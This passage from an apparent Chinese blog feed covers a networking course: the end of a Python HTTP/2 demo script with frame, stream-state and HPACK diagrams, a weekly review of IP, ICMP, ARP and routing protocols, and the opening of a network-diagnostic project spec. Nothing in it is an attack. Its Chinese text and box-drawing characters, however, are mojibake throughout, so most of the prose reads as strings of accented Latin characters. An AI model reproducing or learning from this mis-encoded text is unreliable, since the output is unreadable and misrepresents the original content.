â”‚â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜        &quot;&quot;&quot;)    @staticmethod    def show_stream_states():        &quot;&quot;&quot;        å±•ç¤ºæµçŠ¶æ€è½¬æ¢        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HTTP/2æµçŠ¶æ€è½¬æ¢&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;æµçš„ç”Ÿå‘½å‘¨æœŸï¼š                        +--------+                        | idle   |  åˆå§‹çŠ¶æ€                        +--------+                             |                             | å‘é€/æ¥æ”¶ HEADERS                             |                             v                        +--------+                        | open   |  æ‰“å¼€çŠ¶æ€ï¼ˆåŒå‘é€šä¿¡ï¼‰                        +--------+                             |                â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”                |                         |                | å‘é€ END_STREAM         | æ¥æ”¶ END_STREAM                v                         v          +-------------+           +-------------+          | half-closed |           | half-closed |          | (local)     |           | (remote)    |          +-------------+           +-------------+                |                         |                | æ¥æ”¶ END_STREAM         | å‘é€ END_STREAM                â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜                             v                        +--------+                        | closed |  å…³é—­çŠ¶æ€                        +--------+çŠ¶æ€è¯´æ˜ï¼š- idle: æœªä½¿ç”¨çš„æµ- open: æ´»è·ƒçš„æµï¼Œå¯ä»¥åŒå‘å‘é€å¸§- half-closed: ä¸€ç«¯å·²å…³é—­ï¼Œåªèƒ½å•å‘é€šä¿¡- closed: æµå·²å…³é—­ï¼Œä¸èƒ½å†å‘é€å¸§        &quot;&quot;&quot;)    @staticmethod    def show_hpack_example():        &quot;&quot;&quot;        å±•ç¤ºHPACKå‹ç¼©ç¤ºä¾‹        &quot;&quot;&quot;        print(&quot;\n&quot; + &quot;=&quot;*60)        print(&quot; HPACKå¤´éƒ¨å‹ç¼©ç¤ºä¾‹&quot;)        print(&quot;=&quot;*60)        print(&quot;&quot;&quot;åœºæ™¯ï¼šå‘é€ä¸¤ä¸ªç›¸ä¼¼çš„HTTPè¯·æ±‚è¯·æ±‚1ï¼ˆæœªå‹ç¼©ï¼‰ï¼š:method: GET:scheme: https:path: /index.html:authority: www.example.comuser-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)accept: text/html,application/xhtml+xmlaccept-language: zh-CN,zh;q=0.9accept-encoding: gzip, deflate, brcookie: session_id=abc123; user_id=456åŸå§‹å¤§å°ï¼šçº¦ 280 å­—èŠ‚è¯·æ±‚1ï¼ˆHPACKå‹ç¼©åï¼‰ï¼šä½¿ç”¨ç´¢å¼•ç¼–ç ï¼š  :method: GET       â†’ 2 (é™æ€è¡¨ç´¢å¼•)  :scheme: https     â†’ 7 (é™æ€è¡¨ç´¢å¼•)  :path: /index.html â†’ åŠ¨æ€ç¼–ç   :authority: ...    â†’ åŠ¨æ€ç¼–ç   user-agent: ...    â†’ åŠ¨æ€ç¼–ç å¹¶åŠ å…¥åŠ¨æ€è¡¨  accept: ...        â†’ åŠ¨æ€ç¼–ç å¹¶åŠ å…¥åŠ¨æ€è¡¨  å…¶ä»–å¤´éƒ¨...        â†’ åŠ¨æ€ç¼–ç å¹¶åŠ å…¥åŠ¨æ€è¡¨å‹ç¼©åå¤§å°ï¼šçº¦ 150 å­—èŠ‚å‹ç¼©ç‡ï¼š46%---è¯·æ±‚2ï¼ˆåˆ©ç”¨åŠ¨æ€è¡¨ï¼‰ï¼š:method: GET           â†’ 2 (é™æ€è¡¨):scheme: https         â†’ 7 (é™æ€è¡¨):path: /style.css      â†’ åŠ¨æ€ç¼–ç ï¼ˆåªæœ‰è·¯å¾„ä¸åŒï¼‰:authority: ...        â†’ 62 (åŠ¨æ€è¡¨ç´¢å¼•)user-agent: ...        â†’ 63 (åŠ¨æ€è¡¨ç´¢å¼•)accept: ...            â†’ 64 (åŠ¨æ€è¡¨ç´¢å¼•)accept-language: ...   â†’ 65 (åŠ¨æ€è¡¨ç´¢å¼•)accept-encoding: ...   â†’ 66 (åŠ¨æ€è¡¨ç´¢å¼•)cookie: ...            â†’ 67 (åŠ¨æ€è¡¨ç´¢å¼•)å‹ç¼©åå¤§å°ï¼šçº¦ 30 å­—èŠ‚å‹ç¼©ç‡ï¼š89%åŠ¨æ€è¡¨å†…å®¹ï¼šâ”Œâ”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”â”‚ç´¢å¼•â”‚  åç§°            â”‚  å€¼                  â”‚â”œâ”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤â”‚62 â”‚ :authority       â”‚ www.example.com     â”‚â”‚63 â”‚ user-agent       â”‚ Mozilla/5.0...      â”‚â”‚64 â”‚ accept           â”‚ text/html,...       â”‚â”‚65 â”‚ accept-language  â”‚ zh-CN,zh;q=0.9      â”‚â”‚66 â”‚ accept-encoding  â”‚ gzip, deflate, br   â”‚â”‚67 â”‚ cookie           â”‚ session_id=abc123...â”‚â””â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜æ€»ç»“ï¼š- ç¬¬ä¸€ä¸ªè¯·æ±‚å»ºç«‹åŠ¨æ€è¡¨- åç»­è¯·æ±‚å¤ç”¨åŠ¨æ€è¡¨- å‹ç¼©ç‡éšç€è¯·æ±‚å¢åŠ è€Œæé«˜        &quot;&quot;&quot;)def main():    &quot;&quot;&quot;ä¸»ç¨‹åº&quot;&quot;&quot;    print(&quot;&quot;&quot;    â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—    â•‘       HTTP/2åè®®åˆ†æå™¨ v1.0                               â•‘    â•‘       HTTP/2 Protocol Analyzer                           â•‘    â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•    &quot;&quot;&quot;)    # é¦–å…ˆå±•ç¤ºæ¦‚å¿µæ¼”ç¤ºï¼ˆä¸éœ€è¦ç½‘ç»œè¿æ¥ï¼‰    demo = SimpleHTTP2Demo()    print(&quot;\nã€ç¬¬ä¸€éƒ¨åˆ†ï¼šHTTP/2åŸºç¡€æ¦‚å¿µã€‘&quot;)    demo.show_frame_structure()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    demo.show_stream_states()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    demo.show_hpack_example()    input(&quot;\næŒ‰Enterç»§ç»­...&quot;)    # å®é™…HTTP/2è¿æ¥æ¼”ç¤ºï¼ˆéœ€è¦ç½‘ç»œï¼‰    print(&quot;\nã€ç¬¬äºŒéƒ¨åˆ†ï¼šHTTP/2å®é™…è¿æ¥æ¼”ç¤ºã€‘&quot;)    choice = input(&quot;\næ˜¯å¦è¿›è¡Œå®é™…HTTP/2è¿æ¥æµ‹è¯•ï¼Ÿ(y/n): &quot;).strip().lower()    if choice == &#39;y&#39;:        # ä½¿ç”¨æ”¯æŒHTTP/2çš„ç½‘ç«™è¿›è¡Œæµ‹è¯•        host = input(&quot;è¯·è¾“å…¥æµ‹è¯•ç½‘ç«™ï¼ˆé»˜è®¤ï¼šwww.google.comï¼‰: &quot;).strip()        if not host:            host = &quot;www.google.com&quot;        analyzer = HTTP2Analyzer(host)        if analyzer.connect():            try:                # å•ä¸ªè¯·æ±‚                print(&quot;\n1. å•ä¸ªè¯·æ±‚æµ‹è¯•&quot;)                analyzer.request_single(&#39;/&#39;)                input(&quot;\næŒ‰Enterç»§ç»­...&quot;)                # å¤šè·¯å¤ç”¨æ¼”ç¤º                print(&quot;\n2. å¤šè·¯å¤ç”¨æ¼”ç¤º&quot;)                analyzer.demonstrate_multiplexing()                input(&quot;\næŒ‰Enterç»§ç»­...&quot;)                # æ€§èƒ½å¯¹æ¯”                print(&quot;\n3. æ€§èƒ½å¯¹æ¯”&quot;)                analyzer.compare_http_versions()            except Exception as e:                print(f&quot;\næµ‹è¯•è¿‡ç¨‹å‡ºé”™: {e}&quot;)            finally:                analyzer.close()    else:        print(&quot;\nè·³è¿‡å®é™…è¿æ¥æµ‹è¯•&quot;)    print(&quot;&quot;&quot;    \næ€»ç»“ï¼š    HTTP/2é€šè¿‡ä»¥ä¸‹æŠ€æœ¯æ˜¾è‘—æå‡äº†Webæ€§èƒ½ï¼š    1. äºŒè¿›åˆ¶åˆ†å¸§ - æ›´é«˜æ•ˆçš„ä¼ è¾“    2. å¤šè·¯å¤ç”¨ - æ¶ˆé™¤é˜Ÿå¤´é˜»å¡    3. å¤´éƒ¨å‹ç¼© - å‡å°‘å¸¦å®½æ¶ˆè€—    4. æœåŠ¡å™¨æ¨é€ - ä¸»åŠ¨æ¨é€èµ„æº    5. è¯·æ±‚ä¼˜å…ˆçº§ - ä¼˜åŒ–åŠ è½½é¡ºåº    ä¸‹ä¸€èŠ‚æˆ‘ä»¬å°†å­¦ä¹ HTTP/3å’ŒQUICåè®®ï¼    &quot;&quot;&quot;)if __name__ == &quot;__main__&quot;:    main()</code></pre>]]></content>
    
    
    <categories>
      
      <category>Network</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Network, Book, Python</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜</title>
    <link href="/2025/11/10/27%E5%A4%A9%EF%BC%9A%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/"/>
    <url>/2025/11/10/27%E5%A4%A9%EF%BC%9A%E7%AC%AC%E5%9B%9B%E5%91%A8%E7%BB%BC%E5%90%88%E5%AE%9E%E6%88%98/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜"><a href="#ç¬¬27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜" class="headerlink" title="ç¬¬27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜"></a>ç¬¬27å¤©ï¼šç¬¬å››å‘¨ç»¼åˆå®æˆ˜</h1><h2 id="ä»Šæ—¥ç›®æ ‡"><a href="#ä»Šæ—¥ç›®æ ‡" class="headerlink" title="ä»Šæ—¥ç›®æ ‡"></a>ä»Šæ—¥ç›®æ ‡</h2><ul><li>å›é¡¾ç¬¬å››å‘¨æ ¸å¿ƒçŸ¥è¯†ç‚¹</li><li>å®Œæˆç»¼åˆå®æˆ˜é¡¹ç›®</li><li>å­¦ä¹ ç½‘ç»œæ’é”™æ–¹æ³•</li><li>æŒæ¡æ€§èƒ½ä¼˜åŒ–æŠ€å·§</li><li>æ€»ç»“æœ¬å‘¨å­¦ä¹ æˆæœ</li></ul><hr><h2 id="1-æœ¬å‘¨çŸ¥è¯†å›é¡¾"><a href="#1-æœ¬å‘¨çŸ¥è¯†å›é¡¾" class="headerlink" title="1. æœ¬å‘¨çŸ¥è¯†å›é¡¾"></a>1. æœ¬å‘¨çŸ¥è¯†å›é¡¾</h2><h3 id="1-1-æ ¸å¿ƒåè®®æ€»ç»“"><a href="#1-1-æ ¸å¿ƒåè®®æ€»ç»“" class="headerlink" title="1.1 æ ¸å¿ƒåè®®æ€»ç»“"></a>1.1 æ ¸å¿ƒåè®®æ€»ç»“</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs routeros">ç¬¬å››å‘¨å­¦ä¹ çš„æ ¸å¿ƒåè®®ï¼š<br><br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   åè®®      â”‚    å±‚æ¬¡      â”‚        ä¸»è¦åŠŸèƒ½         â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚<span class="hljs-built_in"> IP </span>(IPv4)   â”‚   ç½‘ç»œå±‚     â”‚ å¯»å€ã€åˆ†ç‰‡ã€è·¯ç”±        â”‚<br>â”‚<span class="hljs-built_in"> IPv6 </span>       â”‚   ç½‘ç»œå±‚     â”‚ ä¸‹ä¸€ä»£IPåè®®            â”‚<br>â”‚ ICMP        â”‚   ç½‘ç»œå±‚     â”‚ é”™è¯¯æŠ¥å‘Šã€è¯Šæ–­          â”‚<br>â”‚ ARP         â”‚   é“¾è·¯å±‚     â”‚<span class="hljs-built_in"> IP </span>â†’ MACåœ°å€æ˜ å°„        â”‚<br>â”‚<span class="hljs-built_in"> RIP </span>        â”‚   åº”ç”¨å±‚     â”‚ è·ç¦»çŸ¢é‡è·¯ç”±åè®®        â”‚<br>â”‚<span class="hljs-built_in"> OSPF </span>       â”‚   åº”ç”¨å±‚     â”‚ é“¾è·¯çŠ¶æ€è·¯ç”±åè®®        â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br><br>åè®®å…³ç³»å›¾ï¼š<br><br>åº”ç”¨å±‚<br>   â†“<br>ä¼ è¾“å±‚ (TCP/UDP)<br>   â†“<br>ç½‘ç»œå±‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>       â”‚<span class="hljs-built_in"> IP </span>(è·¯ç”±ã€å¯»å€)              â”‚<br>       â”‚   â†“                         â”‚<br>       â”‚ ICMP (è¯Šæ–­ã€é”™è¯¯æŠ¥å‘Š)        â”‚<br>       â”‚ RIP<span class="hljs-built_in">/OSPF </span>(åŠ¨æ€è·¯ç”±)         â”‚<br>       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>   â†“<br>é“¾è·¯å±‚ â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>       â”‚ ARP (åœ°å€è§£æ)               â”‚<br>       â”‚<span class="hljs-built_in"> Ethernet </span>(ä»¥å¤ªç½‘å¸§)          â”‚<br>       â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br>   â†“<br>ç‰©ç†å±‚<br></code></pre></td></tr></table></figure><h3 id="1-2-é‡ç‚¹çŸ¥è¯†ç‚¹"><a href="#1-2-é‡ç‚¹çŸ¥è¯†ç‚¹" class="headerlink" title="1.2 é‡ç‚¹çŸ¥è¯†ç‚¹"></a>1.2 é‡ç‚¹çŸ¥è¯†ç‚¹</h3><p><strong>IPåè®®</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">IPv4åœ°å€ï¼š<br><span class="hljs-bullet">- </span>32ä½ï¼Œç‚¹åˆ†åè¿›åˆ¶<br><span class="hljs-bullet">- </span>åœ°å€åˆ†ç±»ï¼šA/B/C/D/E<br><span class="hljs-bullet">- </span>ç§æœ‰åœ°å€ï¼š10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16<br><span class="hljs-bullet">- </span>å­ç½‘åˆ’åˆ†ï¼šVLSM, CIDR<br><br>IPv6åœ°å€ï¼š<br><span class="hljs-bullet">- </span>128ä½ï¼Œå†’å·åå…­è¿›åˆ¶<br><span class="hljs-bullet">- </span>å‹ç¼©è§„åˆ™ï¼šçœç•¥å‰å¯¼é›¶ï¼Œ::è¡¨ç¤ºè¿ç»­é›¶<br><span class="hljs-bullet">- </span>åœ°å€ç±»å‹ï¼šå•æ’­ã€ä»»æ’­ã€å¤šæ’­<br><span class="hljs-bullet">- </span>æ— NATï¼Œç«¯åˆ°ç«¯è¿æ¥<br><br>IPè·¯ç”±ï¼š<br><span class="hljs-bullet">- </span>æœ€é•¿å‰ç¼€åŒ¹é…<br><span class="hljs-bullet">- </span>ç›´è¿è·¯ç”±ã€é™æ€è·¯ç”±ã€åŠ¨æ€è·¯ç”±<br><span class="hljs-bullet">- </span>è·¯ç”±è¡¨æŸ¥æ‰¾è¿‡ç¨‹<br></code></pre></td></tr></table></figure><p><strong>ICMPåè®®</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs markdown">ä¸»è¦ç”¨é€”ï¼š<br><span class="hljs-bullet">-</span> ping: å›æ˜¾è¯·æ±‚/åº”ç­” (Type 8/0)<br><span class="hljs-bullet">-</span> traceroute: åˆ©ç”¨TTLè¶…æ—¶ (Type 11)<br><span class="hljs-bullet">-</span> ç›®æ ‡ä¸å¯è¾¾ (Type 3)<br><br>pingå·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> å‘é€ICMP Echo Request<br><span class="hljs-bullet">2.</span> æ¥æ”¶ICMP Echo Reply<br><span class="hljs-bullet">3.</span> è®¡ç®—RTTï¼ˆå¾€è¿”æ—¶é—´ï¼‰<br><span class="hljs-bullet">4.</span> ç»Ÿè®¡ä¸¢åŒ…ç‡<br><br>tracerouteåŸç†ï¼š<br><span class="hljs-bullet">1.</span> TTL=1å‘é€ï¼Œç¬¬1è·³è¿”å›è¶…æ—¶<br><span class="hljs-bullet">2.</span> TTL=2å‘é€ï¼Œç¬¬2è·³è¿”å›è¶…æ—¶<br><span class="hljs-bullet">3.</span> ...ç›´åˆ°åˆ°è¾¾ç›®æ ‡<br></code></pre></td></tr></table></figure><p><strong>ARPåè®®</strong>ï¼š</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs markdown">å·¥ä½œæµç¨‹ï¼š<br><span class="hljs-bullet">1.</span> æŸ¥ARPç¼“å­˜ â†’ æœ‰åˆ™ä½¿ç”¨<br><span class="hljs-bullet">2.</span> å¹¿æ’­ARPè¯·æ±‚ï¼š&quot;è°æ˜¯X.X.X.Xï¼Ÿ&quot;<br><span class="hljs-bullet">3.</span> ç›®æ ‡ä¸»æœºå•æ’­ARPåº”ç­”ï¼š&quot;æˆ‘æ˜¯ï¼ŒMACæ˜¯...&quot;<br><span class="hljs-bullet">4.</span> æ›´æ–°ARPç¼“å­˜<br><span class="hljs-bullet">5.</span> å‘é€æ•°æ®<br><br>ARPå®‰å…¨ï¼š<br><span class="hljs-bullet">-</span> ARPæ¬ºéª—/ç¼“å­˜æŠ•æ¯’<br><span class="hljs-bullet">-</span> ä¸­é—´äººæ”»å‡»<br><span class="hljs-bullet">-</span> é˜²å¾¡ï¼šDAI, é™æ€ARP, åŠ å¯†åè®®<br></code></pre></td></tr></table></figure><p><strong>è·¯ç”±åè®®</strong>ï¼š</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc">é™æ€è·¯ç”±ï¼š<br><span class="hljs-bullet">- </span>æ‰‹åŠ¨é…ç½®<br><span class="hljs-bullet">- </span>ä¸é€‚åº”å˜åŒ–<br><span class="hljs-bullet">- </span>é€‚åˆå°å‹ç½‘ç»œ<br><br>åŠ¨æ€è·¯ç”±ï¼š<br>â”Œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¬â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”<br>â”‚   åè®®       â”‚     RIP      â”‚    OSPF      â”‚<br>â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¼â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”¤<br>â”‚ ç±»å‹         â”‚  è·ç¦»çŸ¢é‡    â”‚  é“¾è·¯çŠ¶æ€    â”‚<br>â”‚ åº¦é‡         â”‚  è·³æ•°        â”‚  Cost(å¸¦å®½)  â”‚<br>â”‚ æœ€å¤§è·³æ•°     â”‚  15          â”‚  æ— é™åˆ¶      â”‚<br>â”‚ æ”¶æ•›é€Ÿåº¦     â”‚  æ…¢          â”‚  å¿«          â”‚<br>â”‚ é€‚ç”¨åœºæ™¯     â”‚  å°å‹ç½‘ç»œ    â”‚  å¤§å‹ç½‘ç»œ    â”‚<br>â””â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”´â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”˜<br></code></pre></td></tr></table></figure><hr><h2 id="2-ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å¹³å°"><a href="#2-ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å¹³å°" class="headerlink" title="2. ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å¹³å°"></a>2. ç»¼åˆå®æˆ˜é¡¹ç›®ï¼šç½‘ç»œè¯Šæ–­å¹³å°</h2><h3 id="2-1-é¡¹ç›®éœ€æ±‚"><a href="#2-1-é¡¹ç›®éœ€æ±‚" class="headerlink" title="2.1 é¡¹ç›®éœ€æ±‚"></a>2.1 é¡¹ç›®éœ€æ±‚</h3><figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><code class="hljs nix">é¡¹ç›®åç§°ï¼šç½‘ç»œè¯Šæ–­å¹³å°<br>Network Diagnostic Platform<br><br>åŠŸèƒ½éœ€æ±‚ï¼š<br><br><span class="hljs-number">1</span>. åŸºç¡€è¯Šæ–­<br>   âœ… Pingæµ‹è¯•ï¼ˆè¿é€šæ€§ã€RTTã€ä¸¢åŒ…ç‡ï¼‰<br>   âœ… Tracerouteï¼ˆè·¯å¾„è¿½è¸ªï¼‰<br>   âœ… DNSæŸ¥è¯¢<br>   âœ… ç«¯å£æ‰«æ<br><br><span class="hljs-number">2</span>. åè®®åˆ†æ<br>   âœ… IPåœ°å€è®¡ç®—<br>   âœ… å­ç½‘åˆ’åˆ†<br>   âœ… ARPè¡¨æŸ¥çœ‹<br>   âœ… è·¯ç”±è¡¨åˆ†æ<br><br><span class="hljs-number">3</span>. ç½‘ç»œç›‘æ§<br>   âœ… å®æ—¶æµé‡ç›‘æ§<br>   âœ… ARPç›‘æ§<br>   âœ… è¿æ¥çŠ¶æ€ç›‘æ§<br>   âœ… æ€§èƒ½ç»Ÿè®¡<br><br><span class="hljs-number">4</span>. æ•…éšœè¯Šæ–­<br>   âœ… è‡ªåŠ¨è¯Šæ–­ç½‘ç»œé—®é¢˜<br>   âœ… ç”Ÿæˆè¯Šæ–­æŠ¥å‘Š<br>   âœ… æä¾›è§£å†³å»ºè®®<br><br><span class="hljs-number">5</span>. å¯è§†åŒ–<br>   âœ… ç½‘ç»œæ‹“æ‰‘å›¾<br>   âœ… æ€§èƒ½å›¾è¡¨<br>   âœ… å®æ—¶ç›‘æ§é¢æ¿<br><br>æŠ€æœ¯æ ˆï¼š<br><span class="hljs-operator">-</span> è¯­è¨€ï¼šPython <span class="hljs-number">3.8</span><span class="hljs-operator">+</span><br><span class="hljs-operator">-</span> ç½‘ç»œåº“ï¼šsocket, scapy<br><span class="hljs-operator">-</span> å¯è§†åŒ–ï¼šmatplotlib (å¯é€‰)<br><span class="hljs-operator">-</span> ç•Œé¢ï¼šå‘½ä»¤è¡Œ <span class="hljs-operator">+</span> Web (å¯é€‰)<br><br>é¡¹ç›®ç»“æ„ï¼š<br>network_diagnostic<span class="hljs-symbol">/</span><br>â”œâ”€â”€ core<span class="hljs-symbol">/</span><br>â”‚   â”œâ”€â”€ ping.py          <span class="hljs-comment"># PingåŠŸèƒ½</span><br>â”‚   â”œâ”€â”€ traceroute.py    <span class="hljs-comment"># TracerouteåŠŸèƒ½</span><br>â”‚   â”œâ”€â”€ dns.py           <span class="hljs-comment"># DNSæŸ¥è¯¢</span><br>â”‚   â”œâ”€â”€ port_scan.py     <span class="hljs-comment"># ç«¯å£æ‰«æ</span><br>â”‚   â””â”€â”€ arp.py           <span class="hljs-comment"># ARPå·¥å…·</span><br>â”œâ”€â”€ analysis<span class="hljs-symbol">/</span><br>â”‚   â”œâ”€â”€ ip_calc.py       <span class="hljs-comment"># IPè®¡ç®—</span><br>â”‚   â”œâ”€â”€ route.py         <span class="hljs-comment"># è·¯ç”±åˆ†æ</span><br>â”‚  